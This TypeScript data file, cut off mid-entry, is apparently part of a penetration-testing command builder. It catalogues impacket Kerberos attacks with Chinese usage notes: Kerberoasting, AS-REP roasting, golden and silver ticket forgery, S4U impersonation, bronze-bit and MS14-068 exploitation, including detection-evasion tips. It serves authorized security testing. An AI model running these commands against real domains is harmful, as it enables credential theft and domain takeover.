// 参数定义来源为本机 impacket v0.14.0.dev0 --help 与官方 examples
import type { Tool } from '../../../types';
import { buildImpacketAuth, buildImpacketDomainAuth, q, v } from '../../../lib/auth';

export const impacketKerberosTools: Tool[] = [
  {
    id: 'GetUserSPNs',
    name: 'impacket-GetUserSPNs',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py',
    description: 'Kerberoasting - 查询域内用户账户的 SPN 并请求 TGS 票据用于离线破解 (target 为 domain[/user[:pass]]，无 @host)',
    commands: [
      {
        id: 'getuserspns-request',
        title: '请求所有 SPN 用户的 TGS',
        description: '-request 请求 TGS 并输出为 JtR/hashcat 格式',
        build: (p) => `impacket-GetUserSPNs ${buildImpacketDomainAuth(p)} -request`,
        usage: `位置参数:
  target            domain[/username[:password]]，即域身份而非主机 (与 build 生成结构一致)
关键参数:
  -request          为查到的 SPN 用户请求 TGS，并以 JtR/hashcat 格式输出 (默认 False)
  -outputfile FILE  将哈希写入文件 (自动启用 -request)
  -hashes LMHASH:NTHASH  用 NTLM 哈希认证 (仅 NT 哈希时写 :NTHASH)
  -k -no-pass       使用 Kerberos 认证，从 KRB5CCNAME 指向的 ccache 取凭据
  -aesKey HEXKEY    用 AES128/256 Key 做 Kerberos 认证
  -dc-ip IP         指定域控 IP；省略时使用 target 中的域名部分 (FQDN)
说明: 这是经典 Kerberoasting 流程——低权限域用户即可枚举 SPN 并索取 RC4/AES 加密的服务票据离线爆破。`,
        example: 'impacket-GetUserSPNs corp.local/alice:Password123 -dc-ip 10.0.0.10 -request',
      },
      {
        id: 'getuserspns-output',
        title: '导出哈希到文件',
        description: '-outputfile 将哈希写入文件供 hashcat 破解 (自动启用 -request)',
        build: (p) => `impacket-GetUserSPNs ${buildImpacketDomainAuth(p)} -outputfile kerberoast_hashes.txt`,
        usage: `位置参数:
  target            domain[/username[:password]]
关键参数:
  -outputfile FILE  输出文件名，以 JtR/hashcat 格式写入票据哈希；指定后自动启用 -request
  -dc-ip IP         指定域控 IP
  -hashes LMHASH:NTHASH / -k -no-pass / -aesKey HEXKEY  三种可选认证方式
破解参考: hashcat -m 13100 (RC4 TGS-REP) 或 -m 19700 (AES TGS-REP)。`,
        example: 'impacket-GetUserSPNs corp.local/alice:Password123 -dc-ip 10.0.0.10 -outputfile kerberoast_hashes.txt',
      },
      {
        id: 'getuserspns-target',
        title: '请求指定用户的票据',
        description: '-request-user 只接收用户名 (不带 domain/ 前缀)；-request-machine 接收机器名如 workstation01$',
        build: (p) => `impacket-GetUserSPNs ${buildImpacketDomainAuth(p)} -request-user ${v('', 'SPN_USER')}`,
        usage: `位置参数:
  target            domain[/username[:password]]，用于认证与 LDAP 查询
关键参数:
  -request-user USER      只为指定用户名关联的 SPN 请求 TGS (与 -request-machine 互斥)
  -request-machine NAME$  只为指定机器账户关联的 SPN 请求 TGS，如 workstation01$
  -dc-ip IP               指定域控 IP
适用场景: 已通过 BloodHound 等手段锁定高价值 SPN 账户，只针对单个目标降低流量与噪音。`,
        example: 'impacket-GetUserSPNs corp.local/alice:Password123 -dc-ip 10.0.0.10 -request-user sqlsvc',
      },
      {
        id: 'getuserspns-save',
        title: '保存 TGS 为 ccache',
        description: '-save 将请求的 TGS 保存为 <username>.ccache (自动启用 -request)，可用于 pass-the-ticket',
        build: (p) => `impacket-GetUserSPNs ${buildImpacketDomainAuth(p)} -save`,
        usage: `位置参数:
  target            domain[/username[:password]]
关键参数:
  -save             把请求到的每个 TGS 以 <username>.ccache 形式写入磁盘 (自动启用 -request)
  -dc-ip IP         指定域控 IP
说明: 保存的 ccache 可配合 export KRB5CCNAME=<文件> 与其他 impacket 工具的 -k -no-pass
直接进行 pass-the-ticket 访问对应服务，无需破解票据密码。`,
        example: 'impacket-GetUserSPNs corp.local/alice:Password123 -dc-ip 10.0.0.10 -save',
      },
    ],
  },
  {
    id: 'GetNPUsers',
    name: 'impacket-GetNPUsers',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py',
    description: "AS-REP Roasting - 查询设置了 '不要求 Kerberos 预认证' 的用户并导出 AS-REP 哈希用于离线破解",
    commands: [
      {
        id: 'getnpusers-enum',
        title: '枚举无预认证用户 (无需凭据)',
        description: '无凭据时 target 为 domain/ (以斜杠结尾)，-usersfile 每行一个用户名逐个尝试 AS-REQ',
        build: (p) => `impacket-GetNPUsers ${v(p.domain, 'DOMAIN')}/ -usersfile users.txt -dc-ip ${v(p.dcIP, 'DC_IP')} -format hashcat -outputfile asrep_hashes.txt`,
        usage: `位置参数:
  target            [[domain/]username[:password]]；无凭据枚举时只写 domain/ (保留结尾斜杠)
关键参数:
  -usersfile FILE   每行一个用户名的文件，逐个发送 AS-REQ 探测是否无需预认证
  -format {hashcat,john}  输出格式，默认 hashcat
  -outputfile FILE  将 AS-REP 哈希写入文件
  -dc-ip IP         指定域控 IP
说明: 对无需预认证的账户，任何人都能以其名义发 AS-REQ 并获得可用离线破解的 AS-REP，
因此该场景不需要任何有效凭据，适合拿到用户名列表后的早期攻击。`,
        example: 'impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.0.0.10 -format hashcat -outputfile asrep_hashes.txt',
      },
      {
        id: 'getnpusers-request',
        title: '认证后从 DC 枚举并请求',
        description: '有有效凭据时先 LDAP 查询再 -request 请求 TGT，输出为 JtR/hashcat 格式',
        build: (p) => `impacket-GetNPUsers ${buildImpacketDomainAuth(p)} -request`,
        usage: `位置参数:
  target            [[domain/]username[:password]]，提供有效域凭据
关键参数:
  -request          为所有无需预认证的用户请求 TGT 并输出 JtR/hashcat 格式 (默认 False)
  -outputfile FILE  将哈希写入文件
  -hashes LMHASH:NTHASH / -k -no-pass / -aesKey HEXKEY  可选认证方式
  -dc-ip IP         指定域控 IP
说明: 有凭据时工具通过 LDAP 精确找出 userAccountControl 中 DONT_REQUIRE_PREAUTH 置位的
账户，比盲试 usersfile 更安静、更完整。破解参考: hashcat -m 18200。`,
        example: 'impacket-GetNPUsers corp.local/alice:Password123 -dc-ip 10.0.0.10 -request',
      },
    ],
  },
  {
    id: 'getTGT',
    name: 'impacket-getTGT',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/getTGT.py',
    description: '用密码/哈希/AES Key 请求 TGT 并保存为 <username>.ccache (identity 为 [domain/]user[:pass])',
    commands: [
      {
        id: 'gettgt-password',
        title: '通过密码获取 TGT',
        build: (p) => `impacket-getTGT ${buildImpacketDomainAuth(p)}`,
        usage: `位置参数:
  identity          [domain/]username[:password]
关键参数:
  -dc-ip IP         指定域控 IP；省略时使用 identity 中的域名部分 (FQDN)
  -hashes LMHASH:NTHASH / -aesKey HEXKEY / -k -no-pass  其他认证方式
  -principalType T  主体类型，默认 NT_PRINCIPAL，一般无需修改
输出: 成功后在当前目录生成 <username>.ccache。
使用: export KRB5CCNAME=<username>.ccache 后，其他 impacket 工具用 -k -no-pass 认证。`,
        example: 'impacket-getTGT corp.local/alice:Password123 -dc-ip 10.0.0.10',
      },
      {
        id: 'gettgt-hash',
        title: '通过 NTLM 哈希获取 TGT (overpass-the-hash)',
        description: '-hashes 格式为 LMHASH:NTHASH，仅 NT 哈希时用 :NTHASH',
        build: (p) => `impacket-getTGT ${buildImpacketDomainAuth(p)}`,
        usage: `位置参数:
  identity          [domain/]username (此模式下密码写在 -hashes 中)
关键参数:
  -hashes LMHASH:NTHASH  NTLM 哈希；只有 NT 哈希时写 :NTHASH (LM 部分留空)
  -dc-ip IP              指定域控 IP
说明: 即 overpass-the-hash——用 NT 哈希向 KDC 换取合法 TGT，把 NTLM 凭据转换成
Kerberos 票据，之后全程走 Kerberos 可绕过部分 NTLM 检测与限制。`,
        example: 'impacket-getTGT corp.local/alice -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -dc-ip 10.0.0.10',
      },
      {
        id: 'gettgt-aes',
        title: '通过 AES Key 获取 TGT',
        build: (p) => `impacket-getTGT ${buildImpacketDomainAuth(p)}`,
        usage: `位置参数:
  identity          [domain/]username
关键参数:
  -aesKey HEXKEY    AES128 或 AES256 Key (十六进制)，自动按长度选择 etype
  -dc-ip IP         指定域控 IP
说明: AES Key 通常来自 DCSync/secretsdump 的 AES256 密钥。相比 RC4 (NT 哈希)，
AES etype 在现代环境中更常见，票据在日志里看起来也更"正常"。`,
        example: 'impacket-getTGT corp.local/alice -aesKey 5b4b8f2c3a1d9e7f6a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f -dc-ip 10.0.0.10',
      },
      {
        id: 'gettgt-service',
        title: '通过 AS-REQ 直接请求服务票据',
        description: '-service 跳过 TGS-REQ，直接经 AS-REQ 获取指定 SPN 的服务票据',
        build: (p) => `impacket-getTGT ${buildImpacketDomainAuth(p)} -service ${v(p.spn, 'SERVICE/HOST')}`,
        usage: `位置参数:
  identity          [domain/]username[:password]
关键参数:
  -service SPN      直接通过 AS-REQ 请求该 SPN 的服务票据 (而非先取 TGT 再 TGS-REQ)
  -dc-ip IP         指定域控 IP
说明: 这是 S4U 类攻击/特殊票据构造中使用的底层能力——AS-REQ 可以直接返回服务票据。
常规取 TGT 场景不需要此参数。`,
        example: 'impacket-getTGT corp.local/alice:Password123 -dc-ip 10.0.0.10 -service cifs/files01.corp.local',
      },
    ],
  },
  {
    id: 'getST',
    name: 'impacket-getST',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/getST.py',
    description: '用密码/哈希/AES Key 请求服务票据 (ST) 并保存为 ccache，支持 S4U2self/S4U2proxy 委派模拟 (identity 为 [domain/]user[:pass]，必须 -spn)',
    commands: [
      {
        id: 'getst-request',
        title: '请求普通服务票据',
        description: '-spn 格式为 service/server，如 cifs/dc01.corp.local',
        build: (p) => `impacket-getST ${buildImpacketDomainAuth(p)} -spn ${v(p.spn, 'SERVICE/HOST')}`,
        usage: `位置参数:
  identity          [domain/]username[:password]
关键参数:
  -spn SPN          目标服务的 SPN (service/server)，将为其生成服务票据，必选项
  -hashes LMHASH:NTHASH / -aesKey HEXKEY / -k -no-pass  可选认证方式
  -dc-ip IP         指定域控 IP
输出: 成功后在当前目录生成 <username>.ccache，配合 KRB5CCNAME 做 pass-the-ticket。`,
        example: 'impacket-getST corp.local/alice:Password123 -dc-ip 10.0.0.10 -spn cifs/files01.corp.local',
      },
      {
        id: 'getst-impersonate',
        title: 'S4U 委派模拟任意用户',
        description: '-impersonate 通过 S4U2self (+S4U2proxy) 模拟目标用户；identity 账户必须被允许委派到该 SPN',
        build: (p) => `impacket-getST ${buildImpacketDomainAuth(p)} -spn ${v(p.spn, 'SERVICE/HOST')} -impersonate ${v('', 'ADMIN_USER')}`,
        usage: `位置参数:
  identity          [domain/]username[:password]，被配置了约束委派 (TrustedToAuthForDelegation) 的账户
关键参数:
  -spn SPN               委派目标服务的 SPN
  -impersonate USER      要模拟的目标用户名 (经 S4U2self 获取其票据)
  -dc-ip IP              指定域控 IP
说明: S4U2self 允许服务账户为任意用户索取指向自己的票据；若再配 S4U2proxy 则可将票据
转发到委派目标。典型场景: 拿下配置了约束委派的机器/服务账户后模拟管理员访问 CIFS/HTTP。`,
        example: 'impacket-getST corp.local/websvc:Password123 -dc-ip 10.0.0.10 -spn cifs/dc01.corp.local -impersonate Administrator',
      },
      {
        id: 'getst-force-forwardable',
        title: '强制 forwardable (CVE-2020-17049 / 绕过 Protected Users)',
        description: '-force-forwardable 强制 S4U2self 票据可转发，建议同时提供 -hashes 或 -aesKey',
        build: (p) => `impacket-getST ${buildImpacketDomainAuth(p)} -spn ${v(p.spn, 'SERVICE/HOST')} -impersonate ${v('', 'ADMIN_USER')} -force-forwardable`,
        usage: `位置参数:
  identity          [domain/]username[:password]
关键参数:
  -force-forwardable  强制把 S4U2self 得到的服务票据置为 forwardable
  -impersonate USER     要模拟的目标用户
  -spn SPN              委派目标 SPN
说明: 目标用户在 Protected Users 组或账户勾选 "敏感账户不能委派" 时，正常 S4U2self
票据不可转发、S4U2proxy 会失败。利用 CVE-2020-17049 (bronze bit) 思路翻转 forwardable
标志可绕过；官方建议为 identity 提供 -hashes 或 -aesKey 以获得最佳效果，
也能绕过 "仅 Kerberos" 约束委派的协议限制。`,
        example: 'impacket-getST corp.local/websvc -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -dc-ip 10.0.0.10 -spn cifs/dc01.corp.local -impersonate Administrator -force-forwardable',
      },
      {
        id: 'getst-additional-ticket',
        title: 'RBCD + KCD (S4U2proxy 附加票据)',
        description: '-additional-ticket 在 S4U2proxy 请求中附带一张 forwardable 服务票据 (基于资源的约束委派)',
        build: (p) => `impacket-getST ${buildImpacketDomainAuth(p)} -spn ${v(p.spn, 'SERVICE/HOST')} -impersonate ${v('', 'ADMIN_USER')} -additional-ticket ${v(p.ccachePath, 'ticket.ccache')}`,
        usage: `位置参数:
  identity          [domain/]username[:password]，对目标机器有 msDS-AllowedToActOnBehalfOfOtherIdentity 的账户
关键参数:
  -additional-ticket FILE  在 S4U2proxy 请求中携带的 forwardable 服务票据 (ccache)，仅限 RBCD + 纯 Kerberos KCD 场景
  -impersonate USER        要模拟的用户
  -spn SPN                 目标服务 SPN
说明: RBCD 攻击中，先让可控账户 (如有 SPN 的机器账户) 经 S4U2self 取得 forwardable 票据，
再用本参数把它作为附加证据完成 S4U2proxy，最终得到指向目标服务的模拟票据。`,
        example: 'impacket-getST corp.local/websvc:Password123 -dc-ip 10.0.0.10 -spn cifs/dc01.corp.local -impersonate Administrator -additional-ticket websvc.ccache',
      },
      {
        id: 'getst-altservice',
        title: '替换票据中的服务名 (sname 替换)',
        description: '-altservice 修改票据内的 sname/SPN，绕过 sname 校验修复前的服务限制',
        build: (p) => `impacket-getST ${buildImpacketDomainAuth(p)} -spn ${v(p.spn, 'SERVICE/HOST')} -impersonate ${v('', 'ADMIN_USER')} -altservice ${v('', 'ALT_SERVICE/HOST')}`,
        usage: `位置参数:
  identity          [domain/]username[:password]
关键参数:
  -altservice NEWSNAME  写入票据的新 sname/SPN (如把 ldap/... 改为 cifs/...)
  -spn SPN              原始请求的 SPN
  -impersonate USER     要模拟的用户 (S4U 场景)
说明: 服务票据主体用服务账户密钥加密，sname 本身不被加密保护。同一账户注册了多个 SPN
时 (如机器账户同时有 cifs/、host/、ldap/)，可以把一张票据的 sname 改成同账户的另一个
服务直接使用。适合只有 LDAP 委派票据却需要 SMB 访问的场景。`,
        example: 'impacket-getST corp.local/websvc:Password123 -dc-ip 10.0.0.10 -spn ldap/dc01.corp.local -impersonate Administrator -altservice cifs/dc01.corp.local',
      },
    ],
  },
  {
    id: 'ticketer',
    name: 'impacket-ticketer',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/ticketer.py',
    description: '伪造 Kerberos 黄金/白银票据，离线生成 <用户名>.ccache (位置参数 target 为写入票据的用户名；-domain 与 -domain-sid 必填)',
    commands: [
      {
        id: 'ticketer-golden',
        title: '黄金票据 (krbtgt NT 哈希)',
        description: '-nthash 为 krbtgt 的 NT 哈希；省略 -spn 即生成黄金票据 (TGT)',
        build: (p) => `impacket-ticketer -nthash ${v(p.ntHash, 'KRBTGT_NTHASH')} -domain-sid ${v(p.domainSid, 'DOMAIN_SID')} -domain ${v(p.domain, 'DOMAIN')} ${v(p.username, 'USER')}`,
        usage: `位置参数:
  target            写入新票据的用户名 (如 Administrator，不必真实存在)
关键参数:
  -domain DOMAIN        目标域 FQDN，如 corp.local (必填)
  -domain-sid SID       目标域 SID，如 S-1-5-21-... (必填，可用 lookupsid 获取)
  -nthash NTHASH        krbtgt 账户的 NT 哈希，用于签名票据
  -user-id RID          票据中用户的 RID，默认 500 (Administrator)
  -groups LIST          逗号分隔的组 RID，默认 513,512,520,518,519
  -duration HOURS       票据有效期，默认 24*365*10 小时 (10 年)
输出: <用户名>.ccache，export KRB5CCNAME 后配合 -k -no-pass 使用。`,
        example: 'impacket-ticketer -nthash 31d6cfe0d16ae931b73c59d7e0c089c0 -domain-sid S-1-5-21-1334961600-1763989488-2140997488 -domain corp.local Administrator',
      },
      {
        id: 'ticketer-golden-aes',
        title: '黄金票据 (krbtgt AES Key)',
        description: '-aesKey 为 krbtgt 的 AES128/256 Key，生成的票据加密类型更贴近正常流量',
        build: (p) => `impacket-ticketer -aesKey ${v(p.aesKey, 'KRBTGT_AESKEY')} -domain-sid ${v(p.domainSid, 'DOMAIN_SID')} -domain ${v(p.domain, 'DOMAIN')} ${v(p.username, 'USER')}`,
        usage: `位置参数:
  target            写入新票据的用户名
关键参数:
  -aesKey HEXKEY    krbtgt 的 AES Key (128 或 256 位十六进制)，用于签名票据
  -domain DOMAIN / -domain-sid SID  必填
说明: 与 -nthash 互斥 (签名密钥二选一)。许多检测规则针对 RC4 票据 (etype 0x17)，
AES256 黄金票据在现代默认配置下与真实票据的 etype 一致，更隐蔽。`,
        example: 'impacket-ticketer -aesKey 5b4b8f2c3a1d9e7f6a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f -domain-sid S-1-5-21-1334961600-1763989488-2140997488 -domain corp.local Administrator',
      },
      {
        id: 'ticketer-silver',
        title: '白银票据 (服务账户 NT 哈希)',
        description: '-spn 格式为 service/server (如 cifs/dc01.corp.local)，-nthash 为服务账户 NT 哈希；也可用 -keytab 从 keytab 读密钥',
        build: (p) => `impacket-ticketer -nthash ${v(p.ntHash, 'SERVICE_NTHASH')} -domain-sid ${v(p.domainSid, 'DOMAIN_SID')} -domain ${v(p.domain, 'DOMAIN')} -spn ${v(p.spn, 'SERVICE/HOST')} ${v(p.username, 'USER')}`,
        usage: `位置参数:
  target            写入新票据的用户名
关键参数:
  -spn SPN          目标服务 SPN (service/server)；指定后生成白银票据而非黄金票据
  -nthash NTHASH    服务账户 (机器账户或服务账户) 的 NT 哈希，用于签名
  -keytab FILE      从 keytab 文件读取 SPN 密钥 (仅白银票据)，可代替 -nthash
  -domain DOMAIN / -domain-sid SID  必填
说明: 白银票据不经过 KDC，域控无日志；但 PAC 校验 (PAC validation) 开启的服务会拒绝。
机器账户哈希每 30 天轮换，注意时效。`,
        example: 'impacket-ticketer -nthash 31d6cfe0d16ae931b73c59d7e0c089c0 -domain-sid S-1-5-21-1334961600-1763989488-2140997488 -domain corp.local -spn cifs/dc01.corp.local Administrator',
      },
      {
        id: 'ticketer-extrasid',
        title: 'SID History 注入 (-extra-sid)',
        description: '-extra-sid 在 PAC 中加入 ExtraSids，常用于跨林/子域提升 (如加入 Enterprise Admins)',
        build: (p) => `impacket-ticketer -nthash ${v(p.ntHash, 'KRBTGT_NTHASH')} -domain-sid ${v(p.domainSid, 'DOMAIN_SID')} -domain ${v(p.domain, 'DOMAIN')} -extra-sid ${v('', 'EXTRA_SID')} ${v(p.username, 'USER')}`,
        usage: `位置参数:
  target            写入新票据的用户名
关键参数:
  -extra-sid LIST   逗号分隔的 ExtraSids，写入票据 PAC 的 SIDHistory
  -nthash / -aesKey 签名密钥；-domain / -domain-sid 必填
  -extra-pac        附加 UPN_DNS PAC (某些服务校验时需要)
  -old-pac          使用旧 PAC 结构 (去掉 PAC_ATTRIBUTES_INFO / PAC_REQUESTOR)
说明: 经典子域到林根提升: 用子域 krbtgt 哈希伪造票据，extra-sid 填
<根域SID>-519 (Enterprise Admins)，即可访问根域 DC。SID 过滤开启的信任不适用。`,
        example: 'impacket-ticketer -nthash 31d6cfe0d16ae931b73c59d7e0c089c0 -domain-sid S-1-5-21-1334961600-1763989488-2140997488 -domain child.corp.local -extra-sid S-1-5-21-569411596-3229291619-2985884989-519 Administrator',
      },
      {
        id: 'ticketer-request',
        title: '克隆真实票据 (-request)',
        description: '-request 先向域请求真实票据再按参数改写，需指定 -user；可降低票据特征异常',
        build: (p) => `impacket-ticketer -request -nthash ${v(p.ntHash, 'KRBTGT_NTHASH')} -domain-sid ${v(p.domainSid, 'DOMAIN_SID')} -domain ${v(p.domain, 'DOMAIN')} -user ${v(p.username, 'USER')} -password ${q(v(p.password, 'PASSWORD'))} -dc-ip ${v(p.dcIP, 'DC_IP')} ${v('', 'TICKET_USER')}`,
        usage: `位置参数:
  target            新票据中的用户名
关键参数:
  -request          先向 DC 请求一张真实票据，克隆后只改写提供的字段 (需配合 -user)
  -user USER        认证用的 domain/username 中的用户名部分
  -password PASS / -hashes LMHASH:NTHASH  -user 的凭据
  -dc-ip IP         指定域控 IP
  -nthash / -aesKey 重新签名用的密钥；-domain / -domain-sid 必填
说明: 纯离线伪造的票据 PAC 里部分字段可能与真实用户不符被检测；克隆模式以真实票据为
模板，只替换关键字段，结构更逼真。`,
        example: 'impacket-ticketer -request -nthash 31d6cfe0d16ae931b73c59d7e0c089c0 -domain-sid S-1-5-21-1334961600-1763989488-2140997488 -domain corp.local -user alice -password Password123 -dc-ip 10.0.0.10 Administrator',
      },
    ],
  },
  {
    id: 'ticketConverter',
    name: 'impacket-ticketConverter',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/ticketConverter.py',
    description: '在 kirbi (KRB-CRED) 与 ccache 两种票据格式之间互转 (位置参数: 输入文件 输出文件)',
    commands: [
      {
        id: 'ticketconverter-kirbi2ccache',
        title: 'kirbi 转 ccache',
        description: '把 mimikatz/Rubeus 导出的 .kirbi 转为 impacket 可用的 .ccache',
        build: (p) => `impacket-ticketConverter ${v('', 'ticket.kirbi')} ${v(p.ccachePath, 'ticket.ccache')}`,
        usage: `位置参数:
  input_file   输入票据文件，kirbi (KRB-CRED) 或 ccache 格式，工具自动识别
  output_file  输出文件，格式取与输入相反的另一种
说明: kirbi 是 mimikatz/Rubeus 的票据格式；ccache 是 MIT Kerberos/impacket 的格式。
转换后在 Linux 上 export KRB5CCNAME=<输出文件> 即可配合 impacket -k 使用。
该工具无任何认证/网络参数，纯本地格式转换。`,
        example: 'impacket-ticketConverter administrator.kirbi administrator.ccache',
      },
      {
        id: 'ticketconverter-ccache2kirbi',
        title: 'ccache 转 kirbi',
        description: '把 .ccache 转为 .kirbi，方便在 Windows 上用 Rubeus/mimikatz 注入',
        build: (p) => `impacket-ticketConverter ${v(p.ccachePath, 'ticket.ccache')} ${v('', 'ticket.kirbi')}`,
        usage: `位置参数:
  input_file   输入的 ccache 票据文件
  output_file  输出的 kirbi 文件
说明: 常用于把 ticketer/getST 生成的 ccache 带到 Windows 目标上，
用 Rubeus ptt /ticket:<kirbi> 或 mimikatz kerberos::ptt 注入内存。`,
        example: 'impacket-ticketConverter administrator.ccache administrator.kirbi',
      },
    ],
  },
  {
    id: 'describeTicket',
    name: 'impacket-describeTicket',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/describeTicket.py',
    description: '解析 ccache 票据、用服务账户密钥解密 enc-part 并解析 PAC (位置参数为票据文件路径)',
    commands: [
      {
        id: 'describeticket-parse',
        title: '仅解析票据结构',
        description: '不提供密钥时也能展示票据明文字段与 PAC 结构 (加密部分除外)',
        build: (p) => `impacket-describeTicket ${v(p.ccachePath, 'ticket.ccache')}`,
        usage: `位置参数:
  ticket   ticket.ccache 文件路径
可选解密凭据 (不提供则只解析明文部分):
  -p/--password PASS / -hp/--hex-password HEX  服务账户明文/十六进制密码
  -u/--user USER / -d/--domain FQDN            服务账户名与域名 (配合密码算密钥)
  -s/--salt SALT    密钥计算盐值，一般自动推导
  --rc4 NT          服务账户 NT 哈希 (RC4 密钥)
  --aes HEXKEY      服务账户 AES128/256 密钥
  --asrep-key HEX   AS reply key，用于解密 PAC Credentials (UnPAC-the-Hash)`,
        example: 'impacket-describeTicket administrator.ccache',
      },
      {
        id: 'describeticket-rc4',
        title: '用服务账户 NT 哈希解密 PAC',
        description: '--rc4 提供服务账户 NT 哈希解密 enc-part，完整展示 PAC (组、SID、LogonInfo 等)',
        build: (p) => `impacket-describeTicket ${v(p.ccachePath, 'ticket.ccache')} --rc4 ${v(p.ntHash, 'SERVICE_NTHASH')}`,
        usage: `位置参数:
  ticket   ticket.ccache 文件路径
关键参数:
  --rc4 RC4KEY   服务账户的 RC4 密钥，即 NT 哈希
说明: 票据 enc-part 用目标服务账户的 Kerberos 密钥加密。例如票据是 cifs/srv.domain.local
的服务票据，就需要提供拥有该 SPN 的服务账户的密钥才能解密并解析 PAC。
PAC 中包含用户 RID、组成员、LogonInfo 等，是排查票据伪造/委派问题的重要信息。`,
        example: 'impacket-describeTicket cifs_srv.ccache --rc4 31d6cfe0d16ae931b73c59d7e0c089c0',
      },
      {
        id: 'describeticket-unpac',
        title: 'UnPAC-the-Hash (--asrep-key)',
        description: '--aes 解密票据 + --asrep-key 解密 PAC Credentials，从 PKINIT 票据中提取 NT 哈希',
        build: (p) => `impacket-describeTicket ${v(p.ccachePath, 'ticket.ccache')} --aes ${v(p.aesKey, 'SERVICE_AESKEY')} --asrep-key ${v('', 'ASREP_KEY')}`,
        usage: `位置参数:
  ticket   ticket.ccache 文件路径 (通常是 PKINIT 获取的 TGT，如 certipy 输出)
关键参数:
  --aes HEXKEY       服务账户 AES 密钥，用于解密票据 enc-part / 解析 PAC
  --asrep-key HEXKEY AS reply key，解密 [MS-PAC] 2.6 PAC Credentials 结构
说明: PKINIT 预认证时 KDC 会在 PAC Credentials 中放入用户 LM/NT 哈希并用 AS reply key
加密。提供 AS reply key 即可还原 NT 哈希——即 UnPAC-the-Hash 攻击原语，
常用于证书认证 (Certify/Certipy) 后恢复账户的 NTLM 凭据。`,
        example: 'impacket-describeTicket administrator.ccache --aes 5b4b8f2c3a1d9e7f6a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f --asrep-key 9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d',
      },
    ],
  },
  {
    id: 'getPac',
    name: 'impacket-getPac',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/getPac.py',
    description: '通过 S4U2self 获取指定用户的 PAC 并解析展示 (credentials 为 domain/user[:pass]，-targetUser 必填；仅支持密码/-hashes)',
    commands: [
      {
        id: 'getpac-password',
        title: '密码认证获取目标用户 PAC',
        description: '-targetUser 指定要取 PAC 的用户；工具会走 S4U2self 并解析 PAC',
        build: (p) => `impacket-getPac ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')}:${q(v(p.password, 'PASSWORD'))} -targetUser ${v('', 'TARGET_USER')}`,
        usage: `位置参数:
  credentials       domain/username[:password]，用于发起请求的有效域凭据
关键参数:
  -targetUser USER  要获取 PAC 的目标用户 (必填)
  -hashes LMHASH:NTHASH  用 NTLM 哈希代替密码
注意: 该工具没有 -dc-ip/-k/-aesKey 参数，域控由域名解析决定，hosts/ DNS 需可达。
说明: 任何已通过预认证的域用户都能经 S4U2self 为任意用户索取指向自己的票据，
票据 PAC 中含目标用户的组、RID 等信息——本质是 MS14-068 时代遗留的 PAC 读取能力，
可用于侦察目标账户权限或研究 PAC 结构。`,
        example: 'impacket-getPac corp.local/alice:Password123 -targetUser Administrator',
      },
      {
        id: 'getpac-hash',
        title: '哈希认证获取目标用户 PAC',
        description: '-hashes 格式 LMHASH:NTHASH，仅 NT 哈希时写 :NTHASH',
        build: (p) => `impacket-getPac ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')} -hashes :${v(p.ntHash, 'NTHASH')} -targetUser ${v('', 'TARGET_USER')}`,
        usage: `位置参数:
  credentials       domain/username (哈希模式下密码由 -hashes 提供)
关键参数:
  -targetUser USER       要获取 PAC 的目标用户 (必填)
  -hashes LMHASH:NTHASH  NTLM 哈希，仅 NT 哈希时写 :NTHASH
说明: 与密码版功能相同，适用于只有 NT 哈希的场景。`,
        example: 'impacket-getPac corp.local/alice -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -targetUser Administrator',
      },
    ],
  },
  {
    id: 'goldenPac',
    name: 'impacket-goldenPac',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/goldenPac.py',
    description: 'MS14-068 漏洞利用 - 用普通域用户伪造带高权限 PAC 的 TGT，随即 PSEXEC 目标或保存票据 (target 为 [[domain/]user[:pass]@]<targetName>)',
    commands: [
      {
        id: 'goldenpac-psexec',
        title: '利用 MS14-068 并 PSEXEC 目标',
        description: '默认在目标上执行 cmd.exe；command 位置参数可指定要执行的命令',
        build: (p) => `impacket-goldenPac ${buildImpacketAuth(p, { kerberos: false, aesKey: false, targetIp: true })}`,
        usage: `位置参数:
  target    [[domain/]username[:password]@]<targetName>，普通域用户 + 目标主机名
  command   在目标执行的命令 (无路径)，默认 cmd.exe；写 None 则只保存票据不执行
关键参数:
  -dc-ip IP      域控 IP (获取用户 SID 需要)，省略时用 target 的域名部分
  -target-ip IP  目标主机 IP，主机名无法解析时使用
  -hashes LMHASH:NTHASH  用哈希认证
前提: 目标域控未打 MS14-068 (KB3011780) 补丁——该漏洞允许任意域用户伪造
包含任意组 (如 Domain Admins) 的 PAC，KDC 直接签发高权限 TGT。`,
        example: 'impacket-goldenPac corp.local/alice:Password123@dc01.corp.local -dc-ip 10.0.0.10',
      },
      {
        id: 'goldenpac-save',
        title: '只保存黄金票据 (不执行 PSEXEC)',
        description: '-w 将票据写成 ccache 文件；command 位置参数写 None 跳过执行',
        build: (p) => `impacket-goldenPac ${buildImpacketAuth(p, { kerberos: false, aesKey: false, targetIp: true })} -w ${v(p.ccachePath, 'ticket.ccache')} None`,
        usage: `位置参数:
  target    [[domain/]username[:password]@]<targetName>
  command   写 None 表示不执行 PSEXEC，只走票据申请流程
关键参数:
  -w PATH    把伪造的黄金票据以 ccache 格式写入该文件
  -dc-ip IP  域控 IP
